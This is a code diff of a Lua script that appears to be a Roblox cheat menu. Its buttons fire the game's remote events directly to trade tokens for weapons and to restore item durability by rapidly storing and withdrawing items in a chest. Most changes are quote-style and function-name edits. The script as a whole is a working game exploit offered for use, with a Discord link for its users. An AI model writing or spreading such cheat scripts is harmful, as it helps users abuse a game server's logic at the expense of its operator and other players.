-})
+local weaponItems = {
+    {"Silver Sword = 1 Token", 11},
+    {"Gold Sword = 2 Token", 12},
+    {"Gold Bow = 3 Token", 13},
+    {"Ruby Sword = 10 Token", 14},
+    {"Diamond Sword = 18 Token", 15},
+    {"Zenyte Sword = 30 Token", 17},
+    {"Diamond Crossbow = 36 Token", 16},
+    {"Zenyte Crossbow = 45 Token", 18},
+    {"Obsidian Club = 80 Token", 19},
+    {"Moonstone Sword = 130 Token", 20},
+}
+for _, item in ipairs(weaponItems) do
+    WeaponTraderSection:CreateButton({
+        Name = item[1],
+        Callback = function()
+            RemoteEvents["TradeTrader"]:FireServer("Weapon Trader", item[2])
+            MakeNotification("Trade", item[1] .. " has been traded", 2)
+        end
+    })
+end
 
 -- ============================================================
 --  REPAIR TAB (NO EMOJIS)
@@ -4275,22 +3818,22 @@ WeaponTraderSection:CreateButton({
 local RepairSection = RepairTab:CreateSection("Repair All Your Shit")
 
 RepairSection:CreateButton({
-    Name = 'Repair ALL Combat Items (One Click)',
+    Name = "Repair ALL Combat Items (One Click)",
     Callback = function()
-        MakeAtlasNotification('Starting...', 'Repairing ALL combat items...', 2)
+        MakeNotification("Starting...", "Repairing ALL combat items...", 2)
         
         local CombatItems = {
-            173, 205, 230, 369, 255, 254, 253, 215, 237, -- Swords
-            206, 207, 208, 209, 210, 211, 219, 235, 367, 379, -- Shields
-            225, 226, 227, 228, 363, 364, 365, 366, -- Armor (Obsidian + Moonstone)
-            201, 202, 203, 204, -- SOUL SET
-            293, 292, 291, 290, 162, 289, -- Staves
-            323 -- Deflectio Book
+            173, 205, 230, 369, 255, 254, 253, 215, 237,
+            206, 207, 208, 209, 210, 211, 219, 235, 367, 379,
+            225, 226, 227, 228, 363, 364, 365, 366,
+            201, 202, 203, 204,
+            293, 292, 291, 290, 162, 289,
+            323
         }
         
         local ClosestChest = GetClosestChest()
         if not ClosestChest then
-            MakeAtlasNotification('No Chest!', 'Place a chest down first!', 3)
+            MakeNotification("No Chest!", "Place a chest down first!", 3)
             return
         end
         
@@ -4312,9 +3855,9 @@ RepairSection:CreateButton({
                     end
                     
                     if hasDegradable then
-                        RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, itemId)
+                        RemoteEvents["UpdateStorageChest"]:FireServer(ClosestChest, true, itemId)
                         task.wait(0.08)
-                        RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, itemId)
+                        RemoteEvents["UpdateStorageChest"]:FireServer(ClosestChest, false, itemId)
                         repairedCount = repairedCount + 1
                         task.wait(0.05)
                     end
@@ -4323,33 +3866,33 @@ RepairSection:CreateButton({
         end
         
         if repairedCount > 0 then
-            MakeAtlasNotification('Repaired ' .. repairedCount .. ' items!', 'All combat items have been restored', 3)
+            MakeNotification("Repaired " .. repairedCount .. " items!", "All combat items have been restored", 3)
         else
             if totalItems > 0 then
-                MakeAtlasNotification('No repairs needed', 'Your combat items are already at full durability', 3)
+                MakeNotification("No repairs needed", "Your combat items are already at full durability", 3)
             else
-                MakeAtlasNotification('No items found', 'You don\'t have any combat items in your inventory', 3)
+                MakeNotification("No items found", "You don't have any combat items in your inventory", 3)
             end
         end
     end
 })
 
 RepairSection:CreateButton({
-    Name = 'Repair Obsidian Club',
+    Name = "Repair Obsidian Club",
     Callback = function()
         local ClosestChest = GetClosestChest()
         if not ClosestChest then
-            MakeAtlasNotification('No Chest!', 'Place a chest down first!', 3)
+            MakeNotification("No Chest!", "Place a chest down first!", 3)
             return
         end
         
-        if MyInventory:FindFirstChild('Obsidian Club') then
-            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, 230)
+        if MyInventory:FindFirstChild("Obsidian Club") then
+            RemoteEvents["UpdateStorageChest"]:FireServer(ClosestChest, true, 230)
             task.wait(0.1)
-            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, 230)
-            MakeAtlasNotification('Repaired', 'Obsidian Club has been restored', 2)
+            RemoteEvents["UpdateStorageChest"]:FireServer(ClosestChest, false, 230)
+            MakeNotification("Repaired", "Obsidian Club has been restored", 2)
         else
-            MakeAtlasNotification('No Club', 'You don\'t have an Obsidian Club', 2)
+            MakeNotification("No Club", "You don't have an Obsidian Club", 2)
         end
     end
 })
@@ -4357,11 +3900,11 @@ RepairSection:CreateButton({
 local CategorySection = RepairTab:CreateSection("Repair Specific Categories")
 
 CategorySection:CreateButton({
-    Name = 'Repair Swords',
+    Name = "Repair Swords",
     Callback = function()
         local ClosestChest = GetClosestChest()
         if not ClosestChest then
-            MakeAtlasNotification('No Chest!', 'Place a chest down first!', 3)
+            MakeNotification("No Chest!", "Place a chest down first!", 3)
             return
         end
         
@@ -4370,23 +3913,23 @@ CategorySection:CreateButton({
         for _, id in ipairs(Swords) do
             local name = ALLITEMSTABLE[id]
             if name and MyInventory:FindFirstChild(name) then
-                RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, id)
+                RemoteEvents["UpdateStorageChest"]:FireServer(ClosestChest, true, id)
                 task.wait(0.08)
-                RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, id)
+                RemoteEvents["UpdateStorageChest"]:FireServer(ClosestChest, false, id)
                 repaired = repaired + 1
                 task.wait(0.05)
             end
         end
-        MakeAtlasNotification('Repaired ' .. repaired .. ' swords', 'All swords have been restored', 2)
+        MakeNotification("Repaired " .. repaired .. " swords", "All swords have been restored", 2)
     end
 })
 
 CategorySection:CreateButton({
-    Name = 'Repair Shields',
+    Name = "Repair Shields",
     Callback = function()
         local ClosestChest = GetClosestChest()
         if not ClosestChest then
-            MakeAtlasNotification('No Chest!', 'Place a chest down first!', 3)
+            MakeNotification("No Chest!", "Place a chest down first!", 3)
             return
         end
         
@@ -4395,23 +3938,23 @@ CategorySection:CreateButton({
         for _, id in ipairs(Shields) do
             local name = ALLITEMSTABLE[id]
             if name and MyInventory:FindFirstChild(name) then
-                RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, id)
+                RemoteEvents["UpdateStorageChest"]:FireServer(ClosestChest, true, id)
                 task.wait(0.08)
-                RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, id)
+                RemoteEvents["UpdateStorageChest"]:FireServer(ClosestChest, false, id)
                 repaired = repaired + 1
                 task.wait(0.05)
             end
         end
-        MakeAtlasNotification('Repaired ' .. repaired .. ' shields', 'All shields have been restored', 2)
+        MakeNotification("Repaired " .. repaired .. " shields", "All shields have been restored", 2)
     end
 })
 
 CategorySection:CreateButton({
-    Name = 'Repair Armor (Obsidian + Moonstone + Soul)',
+    Name = "Repair Armor (Obsidian + Moonstone + Soul)",
     Callback = function()
         local ClosestChest = GetClosestChest()
         if not ClosestChest then
-            MakeAtlasNotification('No Chest!', 'Place a chest down first!', 3)
+            MakeNotification("No Chest!", "Place a chest down first!", 3)
             return
         end
         
@@ -4420,23 +3963,23 @@ CategorySection:CreateButton({
         for _, id in ipairs(Armor) do
             local name = ALLITEMSTABLE[id]
             if name and MyInventory:FindFirstChild(name) then
-                RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, id)
+                RemoteEvents["UpdateStorageChest"]:FireServer(ClosestChest, true, id)
                 task.wait(0.08)
-                RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, id)
+                RemoteEvents["UpdateStorageChest"]:FireServer(ClosestChest, false, id)
                 repaired = repaired + 1
                 task.wait(0.05)
             end
         end
-        MakeAtlasNotification('Repaired ' .. repaired .. ' armor pieces', 'All armor has been restored', 2)
+        MakeNotification("Repaired " .. repaired .. " armor pieces", "All armor has been restored", 2)
     end
 })
 
 CategorySection:CreateButton({
-    Name = 'Repair Staves',
+    Name = "Repair Staves",
     Callback = function()
         local ClosestChest = GetClosestChest()
         if not ClosestChest then
-            MakeAtlasNotification('No Chest!', 'Place a chest down first!', 3)
+            MakeNotification("No Chest!", "Place a chest down first!", 3)
             return
         end
         
@@ -4445,33 +3988,33 @@ CategorySection:CreateButton({
         for _, id in ipairs(Staves) do
             local name = ALLITEMSTABLE[id]
             if name and MyInventory:FindFirstChild(name) then
-                RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, id)
+                RemoteEvents["UpdateStorageChest"]:FireServer(ClosestChest, true, id)
                 task.wait(0.08)
-                RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, id)
+                RemoteEvents["UpdateStorageChest"]:FireServer(ClosestChest, false, id)
                 repaired = repaired + 1
                 task.wait(0.05)
             end
         end
-        MakeAtlasNotification('Repaired ' .. repaired .. ' staves', 'All staves have been restored', 2)
+        MakeNotification("Repaired " .. repaired .. " staves", "All staves have been restored", 2)
     end
 })
 
 CategorySection:CreateButton({
-    Name = 'Repair Deflectio Book',
+    Name = "Repair Deflectio Book",
     Callback = function()
         local ClosestChest = GetClosestChest()
         if not ClosestChest then
-            MakeAtlasNotification('No Chest!', 'Place a chest down first!', 3)
+            MakeNotification("No Chest!", "Place a chest down first!", 3)
             return
         end
         
-        if MyInventory:FindFirstChild('Deflectio Projectio Spellbook') then
-            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, 323)
+        if MyInventory:FindFirstChild("Deflectio Projectio Spellbook") then
+            RemoteEvents["UpdateStorageChest"]:FireServer(ClosestChest, true, 323)
             task.wait(0.1)
-            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, 323)
-            MakeAtlasNotification('Repaired', 'Deflectio Book has been restored', 2)
+            RemoteEvents["UpdateStorageChest"]:FireServer(ClosestChest, false, 323)
+            MakeNotification("Repaired", "Deflectio Book has been restored", 2)
         else
-            MakeAtlasNotification('No Book', 'You don\'t have a Deflectio Book', 2)
+            MakeNotification("No Book", "You don't have a Deflectio Book", 2)
         end
     end
 })
@@ -4479,45 +4022,45 @@ CategorySection:CreateButton({
 local OldRepairSection = RepairTab:CreateSection("Instant Repair Sets")
 
 OldRepairSection:CreateDropdown({
-    Name = 'Instant Repair Set',
-    DefaultItemSelected = '...',
-    Options = {'MoonstoneSet', 'ObsidianSet', 'AllShields', 'AllSwords', 'AllBows', 'AllBooks', 'AllStaffs'},
+    Name = "Instant Repair Set",
+    DefaultItemSelected = "...",
+    Options = {"MoonstoneSet", "ObsidianSet", "AllShields", "AllSwords", "AllBows", "AllBooks", "AllStaffs"},
     Callback = function(Value)
         local ClosestChest = GetClosestChest()
         if not ClosestChest then
-            MakeAtlasNotification('Needs chest', 'Place any chest down!', 2.5)
+            MakeNotification("Needs chest", "Place any chest down!", 2.5)
             return
         end
         local set
 
-        if Value == 'MoonstoneSet' then
+        if Value == "MoonstoneSet" then
             set = MoonstoneSet
-        elseif Value == 'ObsidianSet' then
+        elseif Value == "ObsidianSet" then
             set = ObsidianSet
-        elseif Value == 'AllShields' then
+        elseif Value == "AllShields" then
             set = AllShields
-        elseif Value == 'AllSwords' then
+        elseif Value == "AllSwords" then
             set = AllSwords
-        elseif Value == 'AllBows' then
+        elseif Value == "AllBows" then
             set = AllBows
-        elseif Value == 'AllBooks' then
+        elseif Value == "AllBooks" then
             set = AllBooks
-        elseif Value == 'AllStaffs' then
+        elseif Value == "AllStaffs" then
             set = AllStaffs
         end
         
         for _, piece in pairs(set) do
-            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, piece)
-            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, piece)
+            RemoteEvents["UpdateStorageChest"]:FireServer(ClosestChest, true, piece)
+            RemoteEvents["UpdateStorageChest"]:FireServer(ClosestChest, false, piece)
         end
-        MakeAtlasNotification('Repaired', 'Repaired '..Value, 1)
+        MakeNotification("Repaired", "Repaired "..Value, 1)
     end
 })
 
 -- ============================================================
 --  CREDITS TAB
 -- ============================================================
-local CreditSection = Credits:CreateSection('Credits')
+local CreditSection = Credits:CreateSection("Credits")
 
 CreditSection:CreateParagraph("Created by dd")
 CreditSection:CreateParagraph("Join the discord! https://discord.gg/LWare")
